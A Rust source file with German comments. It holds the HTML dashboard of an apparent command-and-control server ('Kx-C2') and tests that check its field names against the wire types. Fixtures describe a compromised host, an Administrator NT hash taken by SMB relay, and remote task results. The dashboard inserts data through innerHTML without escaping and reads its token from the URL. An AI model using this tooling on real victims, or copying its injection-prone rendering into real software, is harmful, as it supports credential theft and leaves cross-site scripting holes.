//! Kx-Server Dashboard: einfache HTML-Übersicht über Hosts, Secrets, Tasks.
//!
//! Liefert eine minimale Single-Page-Übersicht, die die JSON-API abfragt.

/// Statische HTML-Datei für das Dashboard.
pub const DASHBOARD_HTML: &str = r#"<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <title>Kx-C2 Dashboard</title>
  <style>
    body { font-family: monospace; background:#111; color:#ddd; margin:2rem; }
    h1 { color:#7f8; } table { border-collapse: collapse; width:100%; }
    th, td { border:1px solid #444; padding:6px; text-align:left; }
    th { background:#222; } .host { color:#8cf; } .secret { color:#fc6; }
  </style>
</head>
<body>
  <h1>Kx-C2 Dashboard</h1>
  <h2>Hosts</h2>
  <table id="hosts"><thead><tr><th>IP</th><th>Hostname</th><th>OS</th><th>Status</th></tr></thead><tbody></tbody></table>
  <h2>Secrets</h2>
  <table id="secrets"><thead><tr><th>Host</th><th>Typ</th><th>Benutzer</th><th>Passwort</th><th>Quelle</th></tr></thead><tbody></tbody></table>
  <h2>Tasks</h2>
  <table id="tasks"><thead><tr><th>Host</th><th>Befehl</th><th>Status</th><th>Ergebnis</th></tr></thead><tbody></tbody></table>
  <script>
    const TOKEN = new URLSearchParams(location.search).get('token') || '';
    async function load(path, id, map) {
      const r = await fetch(path, { headers: { 'Authorization': 'Bearer ' + TOKEN } });
      if (!r.ok) { document.getElementById(id).innerHTML = '<tr><td>Auth fehlgeschlagen</td></tr>'; return; }
      const data = await r.json();
      document.querySelector('#'+id+' tbody').innerHTML =
        data.map(row => '<tr>' + map(row).join('') + '</tr>').join('');
    }
    load('/api/hosts', 'hosts', h => [h.ip, h.hostname, h.os, h.status].map(x => `<td>${x}</td>`));
    load('/api/secrets', 'secrets', s => [s.host_id, s.cred_type, s.username, s.password, s.source].map(x => `<td>${x}</td>`));
    load('/api/tasks', 'tasks', t => [t.host_id, t.command, t.status, t.result].map(x => `<td>${x}</td>`));
  </script>
</body>
</html>"#;

#[cfg(test)]
mod tests {
    use super::*;
    use kx_core::c2;
    use std::collections::BTreeSet;

    /// Die Feldnamen, die das Dashboard-JavaScript liest, und der Typ, zu dem sie
    /// gehören. Das Dashboard ist die fünfte Fundstelle des Wire-Vertrags — sie
    /// steckt in einem JavaScript-String und driftete deshalb unbemerkt.
    fn dashboard_reads() -> Vec<(&'static str, char)> {
        let mut out = Vec::new();
        for line in DASHBOARD_HTML.lines() {
            let Some(start) = line.find("load('") else {
                continue;
            };
            let rest = &line[start + "load('".len()..];
            let end = rest.find('\'').expect("Endpunkt-Strich");
            let endpoint = &rest[..end];
            // Der Mapper beginnt mit `h => [h.feld, ...]` — die Variable vor der
            // Klammer benennt den Typ, aus dem die Felder gelesen werden.
            let arrow = line.find("=> [").expect("Mapper-Start");
            let prefix = line[arrow + "=> [".len()..]
                .chars()
                .next()
                .expect("Mapper-Variable");
            out.push((endpoint, prefix));
        }
        out
    }

    /// Liest alle `prefix.feld`-Zugriffe einer Zeile ein.
    fn fields_of(line: &str, prefix: char) -> BTreeSet<String> {
        let chars: Vec<char> = line.chars().collect();
        let mut out = BTreeSet::new();
        let mut i = 0;
        while i < chars.len() {
            if chars[i] == prefix && i + 1 < chars.len() && chars[i + 1] == '.' {
                let mut field = String::new();
                for c in &chars[i + 2..] {
                    if c.is_ascii_alphanumeric() || *c == '_' {
                        field.push(*c);
                    } else {
                        break;
                    }
                }
                if !field.is_empty() {
                    i += 2 + field.chars().count();
                    out.insert(field);
                } else {
                    i += 2;
                }
                continue;
            }
            i += 1;
        }
        out
    }

    fn keys<T: serde::Serialize>(value: &T) -> BTreeSet<String> {
        serde_json::to_value(value)
            .expect("serialisierbar")
            .as_object()
            .expect("Objekt")
            .keys()
            .cloned()
            .collect()
    }

    fn sample_host() -> c2::Host {
        c2::Host {
            host_id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: "target".into(),
            os: "Windows".into(),
            status: c2::STATUS_COMPROMISED.into(),
            first_seen: "2026-11-11T00:00:00Z".into(),
            last_seen: "2026-11-11T00:05:00Z".into(),
        }
    }

    fn sample_secret() -> c2::ExfiltratedSecret {
        c2::ExfiltratedSecret {
            id: "s-1".into(),
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: "hash".into(),
            source: "smb_relay".into(),
            collected_at: "2026-11-11T00:05:00Z".into(),
        }
    }

    fn sample_task() -> c2::Task {
        c2::Task {
            id: "t-1".into(),
            host_id: "10.0.0.5".into(),
            command: "whoami".into(),
            status: "done".into(),
            result: "nt authority\\system".into(),
            created_at: "2026-11-11T00:06:00Z".into(),
        }
    }

    #[test]
    fn dashboard_endpoints_are_the_contract_paths() {
        let reads = dashboard_reads();
        assert_eq!(reads.len(), 3, "das Dashboard lädt genau drei Endpunkte");
        let endpoints: Vec<&str> = reads.iter().map(|(e, _)| *e).collect();
        assert_eq!(
            endpoints,
            vec![c2::PATH_HOSTS, c2::PATH_SECRETS, c2::PATH_TASKS]
        );
    }

    #[test]
    fn dashboard_reads_only_fields_the_contract_defines() {
        let mut checked = 0;
        for line in DASHBOARD_HTML.lines() {
            if !line.contains("load('") {
                continue;
            }
            let prefix = line[line.find("=> [").expect("Mapper-Start") + "=> [".len()..]
                .chars()
                .next()
                .expect("Mapper-Variable");
            let fields = fields_of(line, prefix);
            assert!(!fields.is_empty(), "Mapper liest keine Felder");
            let available = match prefix {
                'h' => keys(&sample_host()),
                's' => keys(&sample_secret()),
                't' => keys(&sample_task()),
                other => panic!("unbekannter Mapper '{other}'"),
            };
            for field in &fields {
                assert!(
                    available.contains(field),
                    "das Dashboard liest '{prefix}.{field}', das der Wire-Typ nicht kennt"
                );
            }
            checked += fields.len();
        }
        assert!(checked >= 13, "erwartete Feldzugriffe, gefunden: {checked}");
    }

    #[test]
    fn dashboard_reads_the_task_result_field() {
        // `t.result` ist der Name, den der Server sendet. Vorher sendete er
        // `result`, während der CLI `output` erwartete — das Dashboard war die
        // einzige Stelle, die es richtig las.
        let line = DASHBOARD_HTML
            .lines()
            .find(|l| l.contains("PATH_TASKS") || l.contains("/api/tasks"))
            .expect("Task-Zeile");
        assert!(fields_of(line, 't').contains("result"));
    }
}

